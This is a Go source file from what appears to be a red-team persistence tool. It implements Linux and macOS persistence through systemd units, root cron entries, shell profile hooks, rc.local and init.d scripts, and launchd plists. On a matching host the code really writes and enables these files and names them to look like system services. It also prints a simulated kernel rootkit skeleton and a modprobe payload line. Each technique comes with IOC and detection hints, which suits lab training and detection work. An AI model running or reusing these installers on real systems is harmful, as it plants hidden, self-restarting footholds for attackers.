package engine

// Linux and macOS persistence technique implementations.

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
)

// ── T1543.002 – Systemd Service ──────────────────────────────
func SystemdServicePersist(sess *Session, svcName, payload string) Result {
	def := findTech("T1543.002")
	iocs := def.IOCHints
	det := def.DetectHints
	printTechHeader(def.FullID(), def.Name, def.Severity)

	// Prefer user-level service if not root (no permission issues)
	var svcDir string
	var systemType string
	if os.Getuid() == 0 {
		svcDir = "/etc/systemd/system"
		systemType = "system (root, boot-level)"
	} else {
		svcDir = filepath.Join(HomeDir(), ".config/systemd/user")
		systemType = "user (login-level, --user flag)"
	}
	svcPath := filepath.Join(svcDir, svcName+".service")

	unitContent := fmt.Sprintf(`[Unit]
Description=System Network Compatibility Service
After=network.target
StartLimitIntervalSec=0

[Service]
Type=simple
Restart=always
RestartSec=30
ExecStart=%s

[Install]
WantedBy=multi-user.target
`, payload)

	KV("Unit File", svcPath)
	KV("Type", systemType)
	KV("ExecStart", payload)
	KV("Restart", "always (watchdog — respawns if killed)")
	KV("Trigger", "Boot (system) or user login (user-level)")

	if !IsLinux {
		r := Result{
			TechID: def.FullID(), TechName: def.Name, Status: StatusSim,
			Severity: def.Severity, Location: svcPath, Payload: payload,
			Simulated: true, IOCs: iocs, Detection: det,
			Notes: fmt.Sprintf("[SIMULATED on %s]", Platform()),
		}
		Sim("Would write unit file:")
		printCodeBlock(unitContent)
		Sim("Would run: systemctl enable --now " + svcName)
		printIOCs(iocs)
		printDetection(det)
		return r
	}

	if err := os.MkdirAll(svcDir, 0755); err != nil {
		Fail("Cannot create systemd dir: " + err.Error())
		return Result{TechID: def.FullID(), TechName: def.Name, Status: StatusFail, Severity: def.Severity}
	}
	if err := os.WriteFile(svcPath, []byte(unitContent), 0644); err != nil {
		Fail("Write failed: " + err.Error())
		return Result{TechID: def.FullID(), TechName: def.Name, Status: StatusFail, Severity: def.Severity}
	}

	var enableCmd *exec.Cmd
	if os.Getuid() == 0 {
		exec.Command("systemctl", "daemon-reload").Run()
		enableCmd = exec.Command("systemctl", "enable", svcName)
	} else {
		exec.Command("systemctl", "--user", "daemon-reload").Run()
		enableCmd = exec.Command("systemctl", "--user", "enable", svcName)
	}
	out, err := enableCmd.CombinedOutput()
	if err != nil {
		Warn("Enable warning (may be expected in lab): " + string(out))
	}

	OK("Systemd service created and enabled")
	KV("File", svcPath)
	KV("Status", "Check: systemctl status "+svcName)
	printCodeBlock(unitContent)
	printIOCs(iocs)
	printDetection(det)
	r := Result{TechID: def.FullID(), TechName: def.Name, Status: StatusOK,
		Severity: def.Severity, Location: svcPath, Payload: payload, IOCs: iocs, Detection: det}
	sess.Add(r)
	return r
}

// ── T1053.003 – Cron Job ─────────────────────────────────────
func CronJobPersist(sess *Session, schedule, payload string) Result {
	def := findTech("T1053.003")
	iocs := def.IOCHints
	det := def.DetectHints
	printTechHeader(def.FullID(), def.Name, def.Severity)

	if schedule == "" {
		schedule = "* * * * *" // every minute for demo
	}

	cronEntry := fmt.Sprintf("%s root %s > /dev/null 2>&1\n", schedule, payload)
	cronPath := "/etc/cron.d/sysnetwork"

	KV("Schedule", schedule)
	KV("Payload", payload)
	KV("Cron File", cronPath)
	KV("Frequency", cronDescribe(schedule))
	BlankLine()

	// Also show user-level alternative
	userCron := fmt.Sprintf("%s %s > /dev/null 2>&1", schedule, payload)
	fmt.Println("  " + C(CMag, "Cron entry:"))
	printCodeBlock("# /etc/cron.d/sysnetwork\n" + cronEntry)
	fmt.Println("  " + C(CMag, "User crontab alternative (crontab -e):"))
	printCodeBlock(userCron)

	if !IsLinux && !IsMacOS {
		r := Result{
			TechID: def.FullID(), TechName: def.Name, Status: StatusSim,
			Severity: def.Severity, Location: cronPath, Payload: payload, Simulated: true,
			IOCs: iocs, Detection: det,
		}
		Sim(fmt.Sprintf("[SIMULATED on %s]", Platform()))
		printIOCs(iocs)
		printDetection(det)
		return r
	}

	// Try system cron first, fall back to user crontab
	if os.Getuid() == 0 {
		if err := os.WriteFile(cronPath, []byte(cronEntry), 0644); err != nil {
			Fail("Write failed: " + err.Error())
			return Result{TechID: def.FullID(), TechName: def.Name, Status: StatusFail, Severity: def.Severity}
		}
		OK("Cron job written to " + cronPath)
	} else {
		// Add to user crontab
		currentCron, _ := exec.Command("crontab", "-l").Output()
		if !strings.Contains(string(currentCron), payload) {
			newCron := string(currentCron) + userCron + "\n"
			tmpFile := filepath.Join(os.TempDir(), "pt_cron")
			os.WriteFile(tmpFile, []byte(newCron), 0600)
			out, err := exec.Command("crontab", tmpFile).CombinedOutput()
			os.Remove(tmpFile)
			if err != nil {
				Fail("crontab install failed: " + string(out))
				return Result{TechID: def.FullID(), TechName: def.Name, Status: StatusFail, Severity: def.Severity}
			}
		}
		OK("Cron entry added to user crontab")
	}

	printIOCs(iocs)
	printDetection(det)
	r := Result{TechID: def.FullID(), TechName: def.Name, Status: StatusOK,
		Severity: def.Severity, Location: cronPath, Payload: payload, IOCs: iocs, Detection: det}
	sess.Add(r)
	return r
}

func cronDescribe(s string) string {
	if s == "* * * * *" {
		return "Every minute"
	}
	if s == "@reboot" {
		return "At system reboot"
	}
	parts := strings.Fields(s)
	if len(parts) == 5 {
		return fmt.Sprintf("min=%s hr=%s dom=%s mon=%s dow=%s", parts[0], parts[1], parts[2], parts[3], parts[4])
	}
	return s
}

// ── T1546.004 – Shell Profile Persistence ────────────────────
func ShellProfilePersist(sess *Session, payload string) Result {
	def := findTech("T1546.004")
	iocs := def.IOCHints
	det := def.DetectHints
	printTechHeader(def.FullID(), def.Name, def.Severity)

	home := HomeDir()
	targets := []struct{ path, trigger string }{
		{filepath.Join(home, ".bashrc"),      "Every new bash shell (interactive, non-login)"},
		{filepath.Join(home, ".bash_profile"), "Bash login shells"},
		{filepath.Join(home, ".zshrc"),        "Every new zsh shell"},
		{filepath.Join(home, ".profile"),      "POSIX sh login shells"},
	}

	// System-wide if root
	if os.Getuid() == 0 {
		sysProfile := "/etc/profile.d/syscompat.sh"
		targets = append(targets, struct{ path, trigger string }{sysProfile, "ALL users — every shell login"})
	}

	snippet := fmt.Sprintf("\n# System compatibility hook\n(%s &) 2>/dev/null\n", payload)
	primaryTarget := targets[0].path

	KV("Primary Target", primaryTarget)
	KV("Payload Snippet", snippet)
	KV("Trigger", "Every interactive shell opened by user")
	BlankLine()
	fmt.Println("  " + C(CMag, "All shell profile targets:"))
	for _, t := range targets {
		fmt.Printf("    %s %-42s %s\n", C(CCyan, "▸"), t.path, C(CGray, t.trigger))
	}

	if !IsLinux && !IsMacOS {
		r := Result{
			TechID: def.FullID(), TechName: def.Name, Status: StatusSim,
			Severity: def.Severity, Location: primaryTarget, Payload: payload, Simulated: true,
			IOCs: iocs, Detection: det,
		}
		Sim(fmt.Sprintf("[SIMULATED on %s]", Platform()))
		printIOCs(iocs)
		printDetection(det)
		return r
	}

	// Write to primary target
	f, err := os.OpenFile(primaryTarget, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		Fail("Cannot write to " + primaryTarget + ": " + err.Error())
		return Result{TechID: def.FullID(), TechName: def.Name, Status: StatusFail, Severity: def.Severity}
	}
	fmt.Fprint(f, snippet)
	f.Close()

	OK("Shell profile persistence installed")
	KV("File Modified", primaryTarget)
	KV("Snippet", strings.TrimSpace(snippet))
	printIOCs(iocs)
	printDetection(det)
	r := Result{TechID: def.FullID(), TechName: def.Name, Status: StatusOK,
		Severity: def.Severity, Location: primaryTarget, Payload: payload, IOCs: iocs, Detection: det}
	sess.Add(r)
	return r
}

// ── T1037.004 – RC/Init Script ───────────────────────────────
func RCScriptPersist(sess *Session, payload string) Result {
	def := findTech("T1037.004")
	iocs := def.IOCHints
	det := def.DetectHints
	printTechHeader(def.FullID(), def.Name, def.Severity)

	rcPath := "/etc/rc.local"
	initPath := "/etc/init.d/sysnetwork"

	initScript := fmt.Sprintf(`#!/bin/sh
### BEGIN INIT INFO
# Provides:          sysnetwork
# Required-Start:    $network
# Required-Stop:     $network
# Default-Start:     2 3 4 5
# Default-Stop:      0 1 6
# Short-Description: System Network Compatibility Service
### END INIT INFO

case "$1" in
  start)
    %s &
    ;;
  stop)
    ;;
esac
exit 0
`, payload)

	rcSnippet := fmt.Sprintf("\n# Added by syscompat\n%s &\n", payload)

	KV("RC.local Path", rcPath)
	KV("Init Script", initPath)
	KV("Runs As", "root at boot (before multi-user target)")

	BlankLine()
	fmt.Println("  " + C(CMag, "init.d script:"))
	printCodeBlock(initScript)

	if !IsLinux {
		r := Result{
			TechID: def.FullID(), TechName: def.Name, Status: StatusSim,
			Severity: def.Severity, Simulated: true, IOCs: iocs, Detection: det,
		}
		Sim(fmt.Sprintf("[SIMULATED on %s] Would write %s and %s", Platform(), rcPath, initPath))
		printIOCs(iocs)
		printDetection(det)
		return r
	}

	var installed, installedPath string

	// Try rc.local first
	if _, err := os.Stat(rcPath); err == nil {
		content, _ := os.ReadFile(rcPath)
		if !strings.Contains(string(content), payload) {
			rcContent := strings.Replace(string(content), "exit 0", rcSnippet+"exit 0", 1)
			if err := os.WriteFile(rcPath, []byte(rcContent), 0755); err == nil {
				installed = "rc.local"
				installedPath = rcPath
			}
		}
	}

	// Also write init.d script
	if err := os.WriteFile(initPath, []byte(initScript), 0755); err == nil {
		exec.Command("update-rc.d", "sysnetwork", "defaults").Run()
		if installed == "" {
			installed = "init.d"
			installedPath = initPath
		}
	}

	if installed == "" {
		Fail("Could not write to rc.local or init.d — may need root")
		return Result{TechID: def.FullID(), TechName: def.Name, Status: StatusFail, Severity: def.Severity}
	}

	OK("Boot persistence installed via " + installed)
	KV("Path", installedPath)
	printIOCs(iocs)
	printDetection(det)
	r := Result{TechID: def.FullID(), TechName: def.Name, Status: StatusOK,
		Severity: def.Severity, Location: installedPath, Payload: payload, IOCs: iocs, Detection: det}
	sess.Add(r)
	return r
}

// ── T1053.003b – Launchd Plist (macOS) ───────────────────────
func LaunchdPlistPersist(sess *Session, label, payload string) Result {
	def := findTech("T1053.003b")
	iocs := def.IOCHints
	det := def.DetectHints
	printTechHeader(def.FullID(), def.Name, def.Severity)

	// User-level LaunchAgent
	agentDir := filepath.Join(HomeDir(), "Library/LaunchAgents")
	plistPath := filepath.Join(agentDir, label+".plist")

	plistContent := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
  "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>%s</string>
    <key>ProgramArguments</key>
    <array>
        <string>%s</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
    <key>StandardOutPath</key>
    <string>/dev/null</string>
    <key>StandardErrorPath</key>
    <string>/dev/null</string>
</dict>
</plist>
`, label, payload)

	KV("Plist Path", plistPath)
	KV("Label", label)
	KV("Program", payload)
	KV("RunAtLoad", "true — starts at user login")
	KV("KeepAlive", "true — restarts if killed (watchdog)")
	BlankLine()
	fmt.Println("  " + C(CMag, "Plist content:"))
	printCodeBlock(plistContent)

	if !IsMacOS {
		r := Result{
			TechID: def.FullID(), TechName: def.Name, Status: StatusSim,
			Severity: def.Severity, Location: plistPath, Payload: payload, Simulated: true,
			IOCs: iocs, Detection: det,
		}
		Sim(fmt.Sprintf("[SIMULATED on %s — macOS only]", Platform()))
		printIOCs(iocs)
		printDetection(det)
		return r
	}

	os.MkdirAll(agentDir, 0755)
	if err := os.WriteFile(plistPath, []byte(plistContent), 0644); err != nil {
		Fail("Write failed: " + err.Error())
		return Result{TechID: def.FullID(), TechName: def.Name, Status: StatusFail, Severity: def.Severity}
	}
	exec.Command("launchctl", "load", plistPath).Run()
	OK("LaunchAgent plist installed")
	KV("Plist", plistPath)
	KV("Loaded", "launchctl load "+plistPath)
	KV("Verify", "launchctl list | grep "+label)
	printIOCs(iocs)
	printDetection(det)
	r := Result{TechID: def.FullID(), TechName: def.Name, Status: StatusOK,
		Severity: def.Severity, Location: plistPath, Payload: payload, IOCs: iocs, Detection: det}
	sess.Add(r)
	return r
}

// ── T1547.006 – Kernel Module Demo ───────────────────────────
func KernelModuleDemo(sess *Session) Result {
	def := findTech("T1547.006")
	iocs := def.IOCHints
	det := def.DetectHints
	printTechHeader(def.FullID(), def.Name, def.Severity)
	Warn("SIMULATION ONLY — No kernel module compiled or loaded")
	BlankLine()

	modPath := "/etc/modules-load.d/syscompat.conf"
	modprobePath := "/etc/modprobe.d/syscompat.conf"

	lkmSrc := `#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Operator");
MODULE_DESCRIPTION("Kernel Persistence Demo");

// Rootkit capabilities (demonstration):
// 1. Hook sys_getdents to hide files/processes
// 2. Hook sys_read to intercept file reads
// 3. Remove self from /proc/modules (invisible to lsmod)
// 4. Establish reverse connection to C2

static int __init mod_init(void) {
    printk(KERN_INFO "Module loaded\\n");
    // payload_init();
    return 0;
}

static void __exit mod_exit(void) {
    printk(KERN_INFO "Module unloaded\\n");
}

module_init(mod_init);
module_exit(mod_exit);`

	Info("Kernel-level persistence persistence vectors:")
	BlankLine()
	vectors := []struct{ name, desc string }{
		{"/etc/modules-load.d/", "Module loaded at boot by systemd-modules-load.service"},
		{"/etc/modprobe.d/", "modprobe config — can alias module names to malicious paths"},
		{"insmod/modprobe", "Direct load — detected by init_module/finit_module syscall"},
		{"LD_PRELOAD (userland)", "Userspace alternative — not kernel but similar stealth"},
		{"DKMS", "Dynamic Kernel Module Support — persists across kernel updates"},
	}
	for _, v := range vectors {
		KV(v.name, v.desc)
	}

	BlankLine()
	fmt.Println("  " + C(CMag, "Persistence config files:"))
	fmt.Println("  " + C(CGray, modPath))
	printCodeBlock("syscompat")
	fmt.Println("  " + C(CGray, modprobePath))
	printCodeBlock("install syscompat /sbin/modprobe --ignore-install syscompat; /path/to/payload &")

	BlankLine()
	fmt.Println("  " + C(CMag, "LKM rootkit skeleton (C):"))
	printCodeBlock(lkmSrc)

	BlankLine()
	fmt.Println("  " + C(CMag, "Real-world LKM rootkits:"))
	examples := []string{
		"Reptile — full rootkit: process/file hiding, reverse shell, backdoor",
		"Diamorphine — hides processes, escalates via signal, hides itself from lsmod",
		"Adore-ng — classic Linux kernel rootkit with many hooks",
		"Necurs (rootkit component) — kernel driver protecting Necurs malware",
	}
	for _, ex := range examples {
		fmt.Printf("    %s %s\n", C(CRed, "►"), C(CGray, ex))
	}

	printIOCs(iocs)
	printDetection(det)
	r := Result{TechID: def.FullID(), TechName: def.Name, Status: StatusSim,
		Severity: def.Severity, Simulated: true,
		Notes:     "Conceptual demonstration — no kernel modification performed",
		IOCs:      iocs, Detection: det}
	sess.Add(r)
	return r
}
